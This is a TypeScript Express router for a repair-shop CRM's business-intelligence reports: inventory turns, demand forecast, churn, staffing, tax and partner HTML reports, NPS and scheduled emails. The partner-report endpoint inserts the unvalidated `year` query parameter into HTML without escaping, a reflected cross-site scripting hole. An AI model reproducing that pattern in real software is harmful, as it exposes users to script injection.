     FROM inventory_items ii
     LEFT JOIN ticket_device_parts tdp ON tdp.inventory_item_id = ii.id
       AND DATE(tdp.created_at) >= DATE('now', '-90 days')
     WHERE ii.is_active = 1
     GROUP BY category
     HAVING sold_units > 0 OR avg_stock_value > 0
     ORDER BY sold_value DESC`
  );

  const byCategory = rows.map(r => {
    const sold = Number(r.sold_value);
    const stock = Number(r.avg_stock_value);
    const turns = stock > 0 ? Math.round((sold / stock) * 100) / 100 : 0;
    return {
      category: r.category,
      sold_units: Number(r.sold_units),
      sold_value: Math.round(sold * 100) / 100,
      avg_stock_value: Math.round(stock * 100) / 100,
      turns_90d: turns,
      status: turns >= 1 ? 'healthy' : turns >= 0.5 ? 'slow' : 'stagnant',
    };
  });

  res.json({ success: true, data: { by_category: byCategory } });
}));

// ─── 10. Forecasted demand ───────────────────────────────────────────────

router.get('/demand-forecast', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const months = parseBiDays(req.query.months, 12, 36);

  const rows = await adb.all<{ ym: string; category: string; units: number }>(
    `SELECT strftime('%Y-%m', tdp.created_at) AS ym,
            COALESCE(ii.category, 'Other') AS category,
            SUM(tdp.quantity) AS units
     FROM ticket_device_parts tdp
     JOIN inventory_items ii ON ii.id = tdp.inventory_item_id
     WHERE DATE(tdp.created_at) >= DATE('now', '-' || ? || ' months')
     GROUP BY ym, category
     ORDER BY ym ASC`,
    months
  );

  // Group by category, compute simple trailing average + linear slope
  const byCategory = new Map<string, { ym: string; units: number }[]>();
  for (const r of rows) {
    const list = byCategory.get(r.category) || [];
    list.push({ ym: r.ym, units: Number(r.units) });
    byCategory.set(r.category, list);
  }

  const forecast = Array.from(byCategory.entries()).map(([category, data]) => {
    const total = data.reduce((sum, d) => sum + d.units, 0);
    const avg = data.length > 0 ? total / data.length : 0;
    // Simple YoY trend: compare last 3 months to prior 3 months
    const recent = data.slice(-3).reduce((s, d) => s + d.units, 0) / Math.max(1, Math.min(3, data.length));
    const older = data.slice(-6, -3).reduce((s, d) => s + d.units, 0) / Math.max(1, Math.min(3, data.length - 3));
    const trendPct = older > 0 ? Math.round(((recent - older) / older) * 1000) / 10 : 0;
    return {
      category,
      history: data,
      avg_monthly: Math.round(avg * 10) / 10,
      next_month_forecast: Math.round(recent * 10) / 10,
      trend_pct: trendPct,
    };
  });

  forecast.sort((a, b) => b.avg_monthly - a.avg_monthly);

  res.json({ success: true, data: { forecast, months_analyzed: months } });
}));

// ─── 11. Churn detection ─────────────────────────────────────────────────

router.get('/churn', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const daysInactive = parseBiDays(req.query.days_inactive, 90, 3650);

  // RPT-CHURN1: "Last visit" must use the most recent of the customer's
  // tickets OR invoices — not just tickets. A POS-only customer who never
  // gets a repair ticket would otherwise show up as churned after 90 days
  // even though they bought a charger yesterday. We also use LEFT JOINs
  // on tickets so customers with only invoices still get evaluated; the
  // HAVING clause drops any row whose latest-touch is below the threshold.
  // Spec rule: customers don't log in much — use last touch on records, not
  // last_login_at.
  const rows = await adb.all<{
    customer_id: number;
    name: string;
    phone: string | null;
    last_visit: string | null;
    lifetime_spent: number;
    days_inactive: number;
  }>(
    `SELECT
       c.id AS customer_id,
       COALESCE(c.first_name || ' ' || c.last_name, 'Unknown') AS name,
       c.mobile AS phone,
       last_touch.last_visit AS last_visit,
       COALESCE(
         (SELECT SUM(amount_paid) FROM invoices i
          WHERE i.customer_id = c.id AND i.status != 'void'),
         0
       ) AS lifetime_spent,
       CAST(julianday('now') - julianday(last_touch.last_visit) AS INTEGER) AS days_inactive
     FROM customers c
     JOIN (
       SELECT customer_id, MAX(ts) AS last_visit FROM (
         SELECT customer_id, MAX(created_at) AS ts
         FROM tickets
         WHERE is_deleted = 0 AND customer_id IS NOT NULL
         GROUP BY customer_id
         UNION ALL
         SELECT customer_id, MAX(created_at) AS ts
         FROM invoices
         WHERE status != 'void' AND customer_id IS NOT NULL
         GROUP BY customer_id
       )
       GROUP BY customer_id
     ) last_touch ON last_touch.customer_id = c.id
     WHERE c.is_deleted = 0
       -- RPT-CHURN3: Exclude the walk-in sentinel customer so anonymous POS
       -- transactions don't surface a "Walk-in Customer" in win-back campaigns.
       AND NOT (c.first_name = 'Walk-in' AND c.last_name = 'Customer')
     GROUP BY c.id
     HAVING days_inactive >= ?
     ORDER BY lifetime_spent DESC
     LIMIT 200`,
    daysInactive
  );

  // RPT-CHURN2: at_risk_count must reflect the true total, not be capped by the
  // LIMIT 200 on the customer rows query. Run a lightweight COUNT separately so
  // the badge number is accurate even when there are more than 200 at-risk customers.
  const countRow = await adb.get<{ n: number }>(
    `SELECT COUNT(*) AS n
     FROM customers c
     JOIN (
       SELECT customer_id, MAX(ts) AS last_visit FROM (
         SELECT customer_id, MAX(created_at) AS ts
         FROM tickets
         WHERE is_deleted = 0 AND customer_id IS NOT NULL
         GROUP BY customer_id
         UNION ALL
         SELECT customer_id, MAX(created_at) AS ts
         FROM invoices
         WHERE status != 'void' AND customer_id IS NOT NULL
         GROUP BY customer_id
       )
       GROUP BY customer_id
     ) last_touch ON last_touch.customer_id = c.id
     WHERE c.is_deleted = 0
       AND NOT (c.first_name = 'Walk-in' AND c.last_name = 'Customer')
       AND CAST(julianday('now') - julianday(last_touch.last_visit) AS INTEGER) >= ?`,
    daysInactive
  );

  res.json({
    success: true,
    data: {
      threshold_days: daysInactive,
      at_risk_count: countRow?.n ?? rows.length,
      customers: rows.map(r => ({
        customer_id: r.customer_id,
        name: r.name,
        phone: r.phone,
        last_visit: r.last_visit,
        lifetime_spent: Math.round(Number(r.lifetime_spent) * 100) / 100,
        days_inactive: Number(r.days_inactive),
      })),
    },
  });
}));

// ─── 12. Overstaffing hours ──────────────────────────────────────────────

router.get('/overstaffing', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const days = parseBiDays(req.query.days, 30, 180);

  // Compare tickets-per-hour to number of active techs (from timesheets/users).
  // Without a shift table we approximate: if number of active techs is N, flag
  // any (day, hour) slot where tickets < N/2.
  // RPT-TZ3: Bucket by tenant-local hour so "Tuesday 10 AM" is evaluated in
  // the owner's timezone, not UTC. Otherwise west-coast shops see phantom
  // "overstaffed" midnight slots that are actually their 4 PM rush.
  const tz = getTenantTz(req);
  const mod = tzModifier(tz);
  const rows = await adb.all<{ dow: number; hour: number; ticket_count: number }>(
    `SELECT CAST(strftime('%w', created_at, ?) AS INTEGER) AS dow,
            CAST(strftime('%H', created_at, ?) AS INTEGER) AS hour,
            COUNT(*) AS ticket_count
     FROM tickets
     WHERE is_deleted = 0 AND DATE(created_at) >= DATE('now', '-' || ? || ' days')
     GROUP BY dow, hour`,
    mod, mod, days
  );

  const techCountRow = await adb.get<{ n: number }>(
    `SELECT COUNT(*) AS n FROM users WHERE is_active = 1 AND role = 'technician'`
  );
  const techCount = Number(techCountRow?.n ?? 1) || 1;

  const slotsPerWeek = new Map<string, number>();
  for (const r of rows) {
    const key = `${r.dow}-${r.hour}`;
    slotsPerWeek.set(key, (slotsPerWeek.get(key) || 0) + Number(r.ticket_count));
  }
  const weeks = Math.max(1, days / 7);
  const averagePerSlot = new Map<string, number>();
  for (const [key, total] of slotsPerWeek) {
    averagePerSlot.set(key, total / weeks);
  }

  const suggestions: { dow: number; hour: number; avg_tickets: number; tech_count: number }[] = [];
  const dayLabels = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
  for (const [key, avg] of averagePerSlot) {
    if (avg < techCount / 2 && avg > 0) {
      const [dow, hour] = key.split('-').map(Number);
      suggestions.push({ dow, hour, avg_tickets: Math.round(avg * 10) / 10, tech_count: techCount });
    }
  }
  suggestions.sort((a, b) => a.avg_tickets - b.avg_tickets);

  res.json({
    success: true,
    data: {
      tech_count: techCount,
      days_analyzed: days,
      day_labels: dayLabels,
      overstaffed_slots: suggestions.slice(0, 20),
    },
  });
}));

// ─── 13. Tax report one-click PDF (HTML-as-PDF fallback) ────────────────

router.get('/tax-report.pdf', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const from = String(req.query.from || `${new Date().getFullYear()}-01-01`);
  const to = String(req.query.to || new Date().toISOString().slice(0, 10));
  const jurisdictionRaw = String(req.query.jurisdiction || 'default').trim();
  validateReportDateRange(req, from, to);

  // RPT-TAX1: Aggregate tax collected by tax_class at the LINE-ITEM level via
  // invoice_line_items.tax_class_id. The previous version joined through
  // ticket_devices which (a) only saw invoices linked to tickets and (b)
  // duplicated rows whenever an invoice had multiple devices. Line items
  // are the authoritative tax-class source and work for both repair
  // invoices and pure POS invoices.
  //
  // RPT-TAX2: Jurisdiction filter — if the caller passes a specific value
  // (not the catch-all 'default' / 'all' / ''), filter to tax classes
  // whose name contains that jurisdiction string. The tax_classes table
  // has no dedicated jurisdiction column (see migration 001) so we match
  // on name. Accountants typically name classes "CA Sales Tax",
  // "Denver Combined", etc. — a substring match works for those.
  const hasJurisdictionFilter =
    jurisdictionRaw.length > 0 &&
    jurisdictionRaw.toLowerCase() !== 'default' &&
    jurisdictionRaw.toLowerCase() !== 'all';
  const jurisdictionPattern = `%${jurisdictionRaw}%`;

  const rows = await adb.all<{ tax_class: string; rate: number | null; collected: number }>(
    `SELECT COALESCE(tc.name, 'Unclassified') AS tax_class,
            tc.rate AS rate,
            COALESCE(SUM(ROUND(ili.tax_amount, 2)), 0) AS collected
     FROM invoice_line_items ili
     JOIN invoices i ON i.id = ili.invoice_id
     LEFT JOIN tax_classes tc ON tc.id = ili.tax_class_id
     WHERE i.status IN ('paid', 'partial', 'overpaid')
       AND DATE(i.created_at) BETWEEN ? AND ?
       ${hasJurisdictionFilter ? 'AND LOWER(COALESCE(tc.name, \'\')) LIKE LOWER(?)' : ''}
     GROUP BY tc.id
     HAVING collected > 0
     ORDER BY collected DESC`,
    ...(hasJurisdictionFilter ? [from, to, jurisdictionPattern] : [from, to])
  );

  const totalCollected = rows.reduce((sum, r) => sum + Number(r.collected), 0);
  const totalRevenueRow = await adb.get<{ total: number }>(
    `SELECT COALESCE(SUM(ROUND(subtotal, 2)), 0) AS total FROM invoices
     WHERE status IN ('paid', 'partial', 'overpaid')
       AND DATE(created_at) BETWEEN ? AND ?`,
    from, to
  );

  audit(req.db, 'tax_report_generated', req.user?.id ?? null, req.ip || '', {
    from, to, jurisdiction: jurisdictionRaw, filtered: hasJurisdictionFilter,
  });

  // HTML-as-PDF (print-friendly). Print dialog renders to real PDF.
  // RPT-TAX3: Escape both `tax_class` (comes straight from tc.name) and the
  // jurisdiction query param before splicing into HTML so a tax class named
  // `<script>…</script>` or a jurisdiction URL-encoded with script markup
  // cannot render as JavaScript inside the generated report.
  const escapeHtml = (s: string) =>
    s
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');

  const rowsHtml = rows.map(r =>
    `<tr><td>${escapeHtml(r.tax_class)}${
      r.rate != null ? ` <span style="color:#666;">(${Number(r.rate).toFixed(2)}%)</span>` : ''
    }</td><td class="num">$${Number(r.collected).toFixed(2)}</td></tr>`
  ).join('');

  const jurisdictionLabel = hasJurisdictionFilter
    ? escapeHtml(jurisdictionRaw)
    : 'All jurisdictions';

  const html = `<!DOCTYPE html>
<html><head><meta charset="utf-8"/><title>Tax Report ${from} to ${to}</title>
<style>
  body { font-family: system-ui, -apple-system, sans-serif; margin: 40px; color: #111; }
  h1 { border-bottom: 2px solid #111; padding-bottom: 8px; }
  .meta { color: #555; margin-bottom: 24px; }
  table { border-collapse: collapse; width: 100%; margin-top: 16px; }
  th, td { border: 1px solid #ccc; padding: 8px 12px; text-align: left; }
  th { background: #f5f5f5; }
  .num { text-align: right; font-variant-numeric: tabular-nums; }
  .total { font-weight: bold; background: #fafafa; }
  @media print { button { display: none; } }
</style></head>
<body>
<h1>Sales Tax Report</h1>
<div class="meta">
  <div><strong>Period:</strong> ${from} &rarr; ${to}</div>
  <div><strong>Jurisdiction:</strong> ${jurisdictionLabel}</div>
  <div><strong>Taxable revenue:</strong> $${Number(totalRevenueRow?.total ?? 0).toFixed(2)}</div>
</div>
<table>
  <thead><tr><th>Tax class</th><th class="num">Tax collected</th></tr></thead>
  <tbody>${rowsHtml || '<tr><td colspan="2" style="color:#888;text-align:center;">No taxed invoices in this range.</td></tr>'}</tbody>
  <tfoot><tr class="total"><td>Total remittance due</td><td class="num">$${totalCollected.toFixed(2)}</td></tr></tfoot>
</table>
<button onclick="window.print()" style="margin-top:24px;padding:8px 16px;">Print to PDF</button>
</body></html>`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
}));

// ─── 14. Partner / lender report PDF ────────────────────────────────────

router.get('/partner-report.pdf', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const year = String(req.query.year || new Date().getFullYear());
  const from = `${year}-01-01`;
  const to = new Date().toISOString().slice(0, 10);

  // RPT-PARTNER1: YTD revenue must use the same SUM(payments + imported
  // invoice fallback) formula as /profit-hero, /trend-vs-average, and
  // /margin-trends. Summing only payments misses imported historical
  // invoices and undercounts YTD revenue for any shop that migrated
  // from another CRM.
  //
  // RPT-PARTNER2: COGS uses LEFT JOIN on inventory_items so parts whose
  // catalog row was deleted/renamed still contribute to the cost pool
  // (with cost 0) instead of silently dropping the entire ticket line.
  //
  // RPT-PARTNER3: The margin denominator is null-guarded — a new shop
  // with zero YTD payments must render "—" rather than "0.0%" in the
  // red zone.
  //
  // RPT-PARTNER4: Inventory value filters out the 'service' item type
  // so intangible catalog rows (labor SKUs) don't inflate the
  // "inventory at cost" KPI on the partner report.
  const [revRow, cogsRow, arRow, invValueRow] = await Promise.all([
    adb.get<{ total: number }>(
      `SELECT
         COALESCE(SUM(p.amount), 0) +
         COALESCE(SUM(CASE WHEN p.id IS NULL AND i.amount_paid > 0 THEN i.amount_paid ELSE 0 END), 0)
           AS total
       FROM invoices i
       LEFT JOIN payments p ON p.invoice_id = i.id
       WHERE i.status != 'void'
         AND DATE(COALESCE(p.created_at, i.created_at)) BETWEEN ? AND ?`,
      from, to
    ),
    adb.get<{ total: number }>(
      `SELECT COALESCE(SUM(COALESCE(ii.cost_price, 0) * tdp.quantity), 0) AS total
       FROM ticket_device_parts tdp
       LEFT JOIN inventory_items ii ON ii.id = tdp.inventory_item_id
       JOIN ticket_devices td ON td.id = tdp.ticket_device_id
       JOIN tickets t ON t.id = td.ticket_id
       WHERE t.is_deleted = 0 AND DATE(tdp.created_at) BETWEEN ? AND ?`,
      from, to
    ),
    adb.get<{ total: number }>(
      `SELECT COALESCE(SUM(total - COALESCE(amount_paid, 0)), 0) AS total
       FROM invoices WHERE status IN ('unpaid', 'partial')`
    ),
    adb.get<{ total: number }>(
      `SELECT COALESCE(SUM(in_stock * cost_price), 0) AS total
       FROM inventory_items
       WHERE is_active = 1 AND item_type != 'service'`
    ),
  ]);

  const revenue = Number(revRow?.total ?? 0);
  const cogs = Number(cogsRow?.total ?? 0);
  const gross = revenue - cogs;
  const margin: number | null = revenue > 0 ? (gross / revenue) * 100 : null;
  const marginLabel = margin == null ? '—' : `${margin.toFixed(1)}%`;

  audit(req.db, 'partner_report_generated', req.user?.id ?? null, req.ip || '', { year });

  const html = `<!DOCTYPE html>
<html><head><meta charset="utf-8"/><title>Partner Report ${year}</title>
<style>
  body { font-family: system-ui, sans-serif; margin: 40px; color: #111; max-width: 800px; }
  h1 { border-bottom: 2px solid #111; padding-bottom: 8px; }
  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 24px 0; }
  .kpi { border: 1px solid #ccc; padding: 16px; border-radius: 8px; }
  .kpi h3 { margin: 0 0 4px; font-size: 12px; color: #555; text-transform: uppercase; }
  .kpi .val { font-size: 24px; font-weight: bold; }
  @media print { button { display: none; } }
</style></head>
<body>
<h1>Year-to-Date Partner Report — ${year}</h1>
<div class="grid">
  <div class="kpi"><h3>Revenue</h3><div class="val">$${revenue.toFixed(2)}</div></div>
  <div class="kpi"><h3>Gross Profit</h3><div class="val">$${gross.toFixed(2)}</div></div>
  <div class="kpi"><h3>Gross Margin</h3><div class="val">${marginLabel}</div></div>
  <div class="kpi"><h3>Outstanding Receivables</h3><div class="val">$${Number(arRow?.total ?? 0).toFixed(2)}</div></div>
  <div class="kpi"><h3>Inventory Value (at cost)</h3><div class="val">$${Number(invValueRow?.total ?? 0).toFixed(2)}</div></div>
  <div class="kpi"><h3>COGS</h3><div class="val">$${cogs.toFixed(2)}</div></div>
</div>
<p><em>Report window: ${from} &rarr; ${to}. Figures compiled from the CRM payments, invoices, and inventory ledgers.</em></p>
<button onclick="window.print()" style="padding:8px 16px;">Print to PDF</button>
</body></html>`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
}));

// ─── 15. NPS trend ───────────────────────────────────────────────────────

router.get('/nps-trend', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const months = parseBiDays(req.query.months, 12, 36);

  const rows = await adb.all<{ ym: string; promoters: number; passives: number; detractors: number; n: number }>(
    `SELECT strftime('%Y-%m', responded_at) AS ym,
            SUM(CASE WHEN score >= 9 THEN 1 ELSE 0 END) AS promoters,
            SUM(CASE WHEN score BETWEEN 7 AND 8 THEN 1 ELSE 0 END) AS passives,
            SUM(CASE WHEN score <= 6 THEN 1 ELSE 0 END) AS detractors,
            COUNT(*) AS n
     FROM nps_responses
     WHERE DATE(responded_at) >= DATE('now', '-' || ? || ' months')
     GROUP BY ym
     ORDER BY ym ASC`,
    months
  );

  const trend = rows.map(r => {
    const n = Number(r.n);
    const promPct = n > 0 ? (Number(r.promoters) / n) * 100 : 0;
    const detPct = n > 0 ? (Number(r.detractors) / n) * 100 : 0;
    return {
      month: r.ym,
      responses: n,
      nps: Math.round((promPct - detPct) * 10) / 10,
      promoters: Number(r.promoters),
      passives: Number(r.passives),
      detractors: Number(r.detractors),
    };
  });

  const latest = trend.length > 0 ? trend[trend.length - 1] : null;
  const current_nps = latest?.nps ?? null;

  const overallAgg = trend.reduce(
    (acc, m) => {
      acc.promoters += m.promoters;
      acc.passives += m.passives;
      acc.detractors += m.detractors;
      return acc;
    },
    { promoters: 0, passives: 0, detractors: 0 }
  );

  const totalOverall = overallAgg.promoters + overallAgg.passives + overallAgg.detractors;
  const promPct = totalOverall > 0 ? (overallAgg.promoters / totalOverall) * 100 : 0;
  const detPct = totalOverall > 0 ? (overallAgg.detractors / totalOverall) * 100 : 0;
  const overall = {
    ...overallAgg,
    nps: Math.round((promPct - detPct) * 10) / 10,
  };

  const recentRows = await adb.all<{
    id: number;
    score: number;
    comment: string | null;
    responded_at: string;
    customer_name: string | null;
  }>(
    `SELECT n.id, n.score, n.comment, n.responded_at, 
            COALESCE(c.first_name || ' ' || c.last_name, 'Anonymous') AS customer_name
     FROM nps_responses n
     LEFT JOIN customers c ON c.id = n.customer_id
     WHERE DATE(n.responded_at) >= DATE('now', '-' || ? || ' months')
     ORDER BY n.responded_at DESC
     LIMIT 50`,
     months
  );

  res.json({ success: true, data: { trend, current_nps, overall, monthly: trend, recent: recentRows } });
}));

router.post('/nps', asyncHandler(async (req, res) => {
  const adb = req.asyncDb;
  const { customer_id, ticket_id, score, comment, channel } = req.body || {};
  const scoreNum = Number(score);
  if (!customer_id || !Number.isFinite(scoreNum) || scoreNum < 0 || scoreNum > 10) {
    throw new AppError('customer_id and score (0-10) required', 400);
  }
  const channelOk = ['portal', 'sms', 'email'].includes(String(channel || ''));
  const result = await adb.run(
    `INSERT INTO nps_responses (customer_id, ticket_id, score, comment, channel)
     VALUES (?, ?, ?, ?, ?)`,
    Number(customer_id),
    ticket_id ? Number(ticket_id) : null,
    scoreNum,
    comment ? String(comment).slice(0, 2000) : null,
    channelOk ? String(channel) : null
  );
  res.json({ success: true, data: { id: result.lastInsertRowid } });
}));

// ─── 15b. Referrals Analytics ────────────────────────────────────────────

router.get('/referrals', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;

  const rows = await adb.all<{
    id: number;
    referral_code: string;
    referrer_customer_id: number;
    referrer_name: string | null;
    referred_name: string | null;
    reward_applied: number;
    created_at: string;
    converted_at: string | null;
  }>(
    `SELECT r.id, r.referral_code, r.referrer_customer_id,
            COALESCE(rr.first_name || ' ' || rr.last_name, 'Customer #' || r.referrer_customer_id) AS referrer_name,
            COALESCE(rf.first_name || ' ' || rf.last_name, NULL) AS referred_name,
            r.reward_applied, r.created_at, r.converted_at
     FROM referrals r
     LEFT JOIN customers rr ON rr.id = r.referrer_customer_id
     LEFT JOIN customers rf ON rf.id = r.referred_customer_id
     ORDER BY r.created_at DESC`
  );

  res.json({ success: true, data: rows });
}));

// ─── 16. Scheduled email reports CRUD ────────────────────────────────────

router.get('/scheduled', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const rows = await adb.all<any>(
    `SELECT * FROM scheduled_email_reports ORDER BY created_at DESC`
  );
  res.json({ success: true, data: rows });
}));

router.post('/schedule-email', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const { name, recipient_email, report_type, cron_schedule, config_json } = req.body || {};

  if (!name || !recipient_email || !report_type || !cron_schedule) {
    throw new AppError('name, recipient_email, report_type, cron_schedule all required', 400);
  }
  const allowedTypes = ['weekly_summary', 'monthly_tax', 'partner_pdf'];
  if (!allowedTypes.includes(String(report_type))) {
    throw new AppError(`report_type must be one of ${allowedTypes.join(', ')}`, 400);
  }
  if (!/^\S+@\S+\.\S+$/.test(String(recipient_email))) {
    throw new AppError('recipient_email is not a valid email address', 400);
  }
  if (!/^(\S+\s+){4}\S+$/.test(String(cron_schedule))) {
    throw new AppError('cron_schedule must be a 5-field cron expression', 400);
  }

  const result = await adb.run(
    `INSERT INTO scheduled_email_reports (name, recipient_email, report_type, cron_schedule, config_json)
     VALUES (?, ?, ?, ?, ?)`,
    String(name).slice(0, 100),
    String(recipient_email).slice(0, 255),
    String(report_type),
    String(cron_schedule),
    config_json ? JSON.stringify(config_json) : null
  );

  audit(req.db, 'scheduled_email_created', req.user?.id ?? null, req.ip || '',
    { id: result.lastInsertRowid, report_type, recipient_email });

  res.json({ success: true, data: { id: result.lastInsertRowid } });
}));

router.delete('/scheduled/:id', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const id = Number(req.params.id);
  if (!Number.isFinite(id) || id <= 0) throw new AppError('Invalid id', 400);

  // Verify the row exists before deleting so we can return a proper 404
  // instead of a silent 200 when the id is stale or already deleted.
  const existing = await adb.get<{ id: number }>(`SELECT id FROM scheduled_email_reports WHERE id = ?`, id);
  if (!existing) throw new AppError('Scheduled report not found', 404);

  await adb.run(`DELETE FROM scheduled_email_reports WHERE id = ?`, id);
  audit(req.db, 'scheduled_email_deleted', req.user?.id ?? null, req.ip || '', { id });
  res.json({ success: true, data: { id } });
}));

export default router;
